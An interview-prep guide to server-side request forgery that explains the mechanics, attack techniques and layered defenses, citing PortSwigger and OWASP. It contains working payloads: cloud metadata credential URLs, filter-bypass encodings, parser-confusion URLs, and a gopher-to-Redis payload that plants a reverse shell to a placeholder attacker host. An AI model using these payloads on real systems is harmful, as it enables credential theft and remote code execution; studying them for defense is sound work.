# Server-Side Request Forgery (SSRF)

> SSRF makes the server issue a request to a location the attacker chooses. The server lives inside the trust boundary, so it can reach loopback, RFC1918 internal services, and the cloud metadata endpoint that the attacker's own machine cannot. The root cause is that user input becomes part of a URL (or host, or a URL embedded in a data format) that the server then fetches, with no egress restriction and no reliable agreement between the code that validates the URL and the HTTP client that dereferences it. Two structural facts drive almost every exploit: (1) internal services frequently trust "requests from localhost" and skip authentication, and (2) the validator and the fetcher parse URLs and resolve DNS at different times and by different rules, so anything you prove safe at check-time can differ at use-time. The prize is usually cloud credentials or an unauthenticated internal admin/data plane.

## How it works

Any feature that fetches a resource on the user's behalf is a candidate: webhooks, link unfurling / URL preview, "import from URL," PDF and HTML-to-image renderers, image proxies and thumbnailers, SSO/SAML metadata fetch, open-graph scrapers, XML parsers (XXE to SSRF), and analytics that follow the `Referer` header. The user-controlled part may be a full URL, just a hostname or path fragment spliced into a URL server-side, or a URL buried inside XML/JSON/SVG.

A normal flow looks like this (PortSwigger's stock-check example):

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

Swap the value for an internal target and the server fetches it for you:

```
stockApi=http://localhost/admin
stockApi=http://192.168.0.68/admin
```

WHY the `/admin` case works even though you cannot reach `/admin` directly: the access-control check often lives in a front proxy, or the app grants passwordless admin to "local" callers for disaster recovery, or admin listens on a separate port only reachable from the box. When the request originates from the server itself, those trust assumptions hand you the panel.

The dangerous SSRF targets, in order of usual payoff:

```
# AWS EC2 metadata (link-local, no auth on IMDSv1):
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}  = cloud creds

# GCP metadata (REQUIRES a header, so header control matters):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#   header:  Metadata-Flavor: Google

# Azure IMDS (also header-gated):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
#   header:  Metadata: true

# Internal planes commonly reachable and often unauthenticated:
#   Redis 6379, Memcached 11211, Elasticsearch 9200, Kubernetes API 6443/10250,
#   Docker socket, Spring Boot actuator /env /heapdump, database ports.
```

Non-HTTP schemes widen the blast radius when the client library honors them:

```
file:///etc/passwd                 # local file read
gopher://127.0.0.1:6379/_...       # craft arbitrary TCP bytes (Redis, SMTP, HTTP)
dict://127.0.0.1:6379/CONFIG GET dir   # send one line to a line-based service
```

## Attack techniques

1. Cloud metadata credential theft. The marquee win. On EC2 with IMDSv1, a single GET to `169.254.169.254/latest/meta-data/iam/security-credentials/<role>` returns short-lived IAM keys; those keys, used against the AWS API, are frequently instant lateral movement or privilege escalation across the account. GCP and Azure require a request header (`Metadata-Flavor: Google`, `Metadata: true`), so the exploit needs the SSRF primitive to control a header or use a vector (like a full request smuggle or a fetcher that copies attacker headers) that supplies it. Confirmation: the credential JSON in the response, or, blind, an OOB egress you cause the fetched creds to be sent to.

2. Internal service reach and port scanning. Point the fetch at `127.0.0.1`, `localhost`, or private ranges to hit admin panels, actuators, and datastores. Differential responses and timing (connection refused vs. hang vs. HTTP 200) map open ports and live hosts even when the body is not reflected.

3. gopher:// protocol smuggling to unauthenticated Redis RCE. The canonical blind-SSRF-to-RCE. `gopher://` lets you write raw bytes to a TCP port, so you speak Redis's inline protocol and rewrite where Redis persists its RDB, turning a cache into a cron/webshell writer:

```
# Conceptual command sequence sent to Redis on 6379:
flushall
set x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
# As a gopher payload (CRLF -> %0d%0a, first char after _ is discarded):
gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a%2A3%0d%0a...SAVE%0d%0a
```

WHY it works: Redis by default binds to all interfaces with no auth in many deployments, accepts inline commands, and `CONFIG SET dir` + `dbfilename` + `SAVE` lets you write attacker content to an arbitrary path (crontab, `authorized_keys`, a webroot PHP file). `dict://` achieves single-command variants (`dict://host:6379/CONFIG GET dir`). Detection: OOB reverse shell / DNS callback from the written job.

4. Blind SSRF via OOB and timing. When the response is not returned, the reliable detector is out-of-band (OAST): point the fetch at a Burp Collaborator or your own DNS/HTTP listener and watch for the interaction. A subtle but exam-worthy point from PortSwigger: it is common to see only a DNS lookup and no follow-up HTTP hit, because infrastructure often allows outbound DNS but blocks outbound HTTP to unexpected destinations; the DNS callback alone still proves SSRF. Timing differentials (open vs. filtered internal ports) give a body-less oracle. Blind SSRF is still high-impact: sweep internal IP space with OOB-carrying payloads to trip known unauthenticated bugs, and hit metadata/Redis where no response is needed.

5. Second-order / stored SSRF. The URL is saved and fetched later by a backend worker (thumbnail job, report renderer, webhook dispatcher). You never see the response, but the backend still reaches internal services. Also: SSRF via the `Referer` header, because server-side analytics often visit URLs seen in `Referer`.

6. Denylist bypass with alternate IP encodings. Defenders that block the literal strings `127.0.0.1` / `169.254.169.254` lose to encodings the HTTP client still resolves to the same address:

```
# All resolve to 127.0.0.1:
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0x7f.0x0.0x0.0x1/    # dotted hex
http://0177.0.0.1/          # octal
http://017700000001/        # full octal
http://127.1/               # shorthand (missing octets)
http://[::1]/               # IPv6 loopback
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6
# 169.254.169.254 as decimal:
http://2852039166/
```

WHY: the validator does a string/regex check while the socket layer (glibc `getaddrinfo`, the language's IP parser) accepts many numeric forms. The OWASP cheat sheet notes some parsers are exposed to hex/octal/dword/mixed encoding bypasses and some are not, which is exactly the validator-vs-fetcher gap.

7. DNS-based bypass and rebinding (TOCTOU). Register a name you control that resolves to an internal IP, or that resolves differently across two lookups:

```
# Name that simply points at loopback / metadata:
http://spoofed.attacker.tld/        # A record -> 127.0.0.1 (or 169.254.169.254)

# DNS rebinding: attacker DNS answers with a very low TTL.
#   Lookup #1 (validation)  -> 203.0.113.10  (public, passes the allowlist/denylist)
#   Lookup #2 (the fetch)   -> 127.0.0.1     (internal)
```

WHY rebinding wins: validate-then-fetch designs resolve the name once to check it, then the HTTP client resolves it again a moment later to connect. Time-of-check differs from time-of-use, and the attacker's authoritative server returns a different answer the second time. This defeats any design that trusts the first resolution.

8. Redirect-to-internal. Submit a URL on an allowed host that responds `3xx` to an internal target. If the client follows redirects, the validator's check on the original URL is irrelevant. PortSwigger notes that even switching scheme across the redirect (http to https) has bypassed some filters. Open redirectors on the trusted domain are the classic enabler:

```
stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
# validator sees the allowed host; the app 302s to the internal URL; client follows.
```

9. URL parser confusion (Orange Tsai, "A New Era of SSRF," Black Hat USA 2017). The validator and the fetcher disagree about which token is the host. These are the highest-signal senior payloads:

```
http://expected-host@169.254.169.254/          # userinfo: '@' before the real host
http://169.254.169.254#@expected-host/          # '#' starts a fragment; real host is the IP
http://expected-host#@169.254.169.254/           # inverse, depending on parser
http://169.254.169.254\@expected-host/           # backslash treated as '/' by some, not others
http://foo@evil:80@expected-host/                # double '@' ambiguity
http://expected-host.attacker.tld/               # allowlist substring / suffix confusion
```

WHY: RFC-3986 components (userinfo `user@`, fragment `#`, and non-standard handling of `\`, whitespace, and URL-encoding) are parsed inconsistently across Python `urllib`, Ruby, PHP, Java `URL`, Node, curl, and browsers. Tsai's work demonstrated concrete divergences between these parsers in trending languages; the split lets you present a benign host to the regex and a malicious host to the socket. Also try URL-encoding and double-encoding the dots/slashes when the validator decodes once (or not at all) but the fetcher decodes again.

10. Allowlist string-match weaknesses. If the check is "does the input contain `expected.com`," then `expected.com.attacker.tld` and `attacker.tld/expected.com` pass. Anchor and fully parse, or the allowlist is decorative.

## Defense

Layer these; no single control holds.

1. Allowlist destinations, do not denylist. Where the feature talks to a known, finite set of hosts (OWASP Case 1), permit only those exact hosts/IPs/ports/schemes. Validate the input first with a battle-tested library (Java `InetAddressValidator`/`DomainValidator` from Apache Commons Validator, .NET `IPAddress.TryParse`/`Uri.CheckHostName`, JS `ip-address`, Python `validators.domain`, Ruby `IPAddr`), then string-compare the parsed value against the allowlist. Do not accept full URLs from users; accept a validated IP or domain and build the URL server-side. The OWASP cheat sheet flags which stdlib parsers are themselves bypassable by hex/octal/dword/mixed encodings, so choosing a non-bypassable validator matters.

2. Resolve-then-pin (kills DNS rebinding). Resolve the hostname once, validate the resulting IP against the internal deny ranges, then connect to that exact IP (set it as the connection target / pin it), so there is no second attacker-controlled resolution between check and use. Re-run the full validation on every redirect hop.

3. Deny the internal ranges completely when an allowlist is impossible (OWASP Case 2, arbitrary webhooks). Block, for both IPv4 and IPv6 and after resolution, using an is-global / not-special check rather than hand-rolled regex:

```
127.0.0.0/8   0.0.0.0/8   ::1/128            # loopback
10.0.0.0/8    172.16.0.0/12   192.168.0.0/16  # RFC1918
169.254.0.0/16 (incl. 169.254.169.254)  fe80::/10   # link-local + metadata
100.64.0.0/10 # CGNAT       224.0.0.0/4  ff00::/8   # multicast
metadata.google.internal   metadata.amazonaws.com
```

Python's `ipaddress.ip_address(x).is_global` is a clean primitive; the OWASP cheat sheet ships a resolver that rejects any A/AAAA record that is not global.

4. Disable dangerous schemes and redirects. Allow only `http`/`https`; reject `file`, `gopher`, `dict`, `ftp`, `phar`, `data`. Turn off automatic redirect following in the HTTP client (or re-validate each hop against the pinned-IP rule). Disabling redirects is called out explicitly by OWASP because it neutralizes the open-redirect and rebinding-via-redirect bypasses.

5. Network egress control (strongest single control). Put the fetcher in a segment/VPC with no route to internal management planes or the metadata IP; force outbound through an authenticated forward proxy that enforces the allowlist. Network segregation blocks the illegitimate call at layer 3 regardless of any parser bug in the app.

6. Protect cloud metadata: enforce IMDSv2. IMDSv2 makes credential retrieval a session flow: a `PUT /latest/api/token` (with the `X-aws-ec2-metadata-token-ttl-seconds` header) returns a token, and every `GET` must carry `X-aws-ec2-metadata-token`. A plain GET-only SSRF cannot mint the token, and the default response hop limit of 1 drops metadata replies that would traverse a proxy/container NAT. Set the instance to `HttpTokens=required`, keep the hop limit low, and scope the instance role to least privilege so stolen creds are weak. GCP/Azure header requirements provide analogous friction; do not weaken them.

7. Do not reflect raw responses, and constrain them. Returning the fetched body to the user leaks internal data; if you must, cap size, content type, and timeout, and strip/normalize outbound headers so a header-injection variant cannot add `Metadata: true` or `Metadata-Flavor: Google`.

Reference: OWASP SSRF Prevention Cheat Sheet (Case 1 allowlist / Case 2 denylist split, IMDSv2, resolver monitoring script) and OWASP ASVS controls on outbound request validation.

## Interview-grade nuances

- "We block 127.0.0.1 and 169.254.169.254" is the junior answer. Denylists die to decimal/octal/hex/IPv6 encodings, DNS names pointing inward, redirects, and parser confusion. Seniors allowlist, or resolve-then-pin plus is-global deny.
- "We validate the URL before fetching" is only safe if you pin the resolved IP and re-validate every redirect. Otherwise DNS rebinding (TOCTOU) and 3xx-to-internal walk right through the check. Name the TOCTOU gap explicitly.
- "It is blind, so it is low severity" is wrong. Blind SSRF still steals IAM creds and drives gopher-to-Redis RCE; you confirm with OOB/timing, not a reflected body. Also know that a DNS-only callback (no HTTP) is the expected signal when egress HTTP is filtered.
- IMDSv1 vs IMDSv2 is a frequent probe. Be precise: v2 requires a PUT to obtain a token and a custom header on every GET, and defaults to hop-limit 1. That combination is why a GET-only, header-less SSRF cannot read v2 credentials. Migrating and setting `HttpTokens=required` is the fix, not a WAF rule on the IP.
- Header-gated clouds (GCP/Azure) mean "can the SSRF set a request header?" is a real exploitability question, not a formality. On AWS IMDSv1 no header is needed, which is why it is the easier target.
- Validator/fetcher parser split is the deep root cause. The strongest phrasing in an interview: SSRF filter bypasses are almost all a disagreement between the component that parses the URL for validation and the component that parses it to make the request. Cite Orange Tsai's "A New Era of SSRF" for the `@`, `#`, and `\` parser divergences across languages.
- XXE is an SSRF delivery mechanism. If an app parses attacker XML, external entities can force server-side fetches; the SSRF and XXE fixes are complementary, not the same.
- The single most effective control is network egress restriction, not application-layer URL filtering. If asked to pick one, pick segmentation plus IMDSv2; application validation is defense-in-depth on top.

## Sources

- PortSwigger Web Security Academy, SSRF (server/back-end attacks, denylist and allowlist bypasses, open-redirect bypass, hidden attack surface, Referer): https://portswigger.net/web-security/ssrf
- PortSwigger Web Security Academy, Blind SSRF (OAST detection, DNS-only-callback nuance, internal sweeping): https://portswigger.net/web-security/ssrf/blind
- PortSwigger URL validation bypass cheat sheet (SSRF/CORS/redirect payloads): https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- OWASP Server-Side Request Forgery Prevention Cheat Sheet (Case 1/Case 2, validation libraries, resolver monitoring, IMDSv2, deny-list ranges): https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- Orange Tsai, "A New Era of SSRF: Exploiting URL Parsers in Trending Programming Languages," Black Hat USA 2017: https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- AWS, Configure the instance metadata service (IMDSv1 vs IMDSv2, tokens, hop limit): https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
